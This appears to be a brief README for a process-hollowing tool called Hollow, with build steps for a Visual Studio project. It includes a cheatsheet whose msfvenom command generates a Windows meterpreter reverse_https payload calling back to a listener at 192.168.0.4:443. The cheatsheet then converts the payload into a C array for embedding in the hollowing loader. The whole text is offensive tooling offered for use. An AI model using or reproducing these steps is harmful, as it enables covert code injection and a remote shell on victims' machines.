## Hollow Build Instructions - Visual Studio

1. Create new visual studio project.
2. Add MSFPayload.h and ProcessHollowing.c
3. Update the payload within MSFPayload.h appropriately

## MSFPayload Build Cheatsheet
0. Generate MSF payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f exe -o msf.exe
```

1. Create C array.
```
xxd -i msf.exe
```

2. Copy and paste msfpayload in MSFPayload.h

3. Update variable names as appropriate.

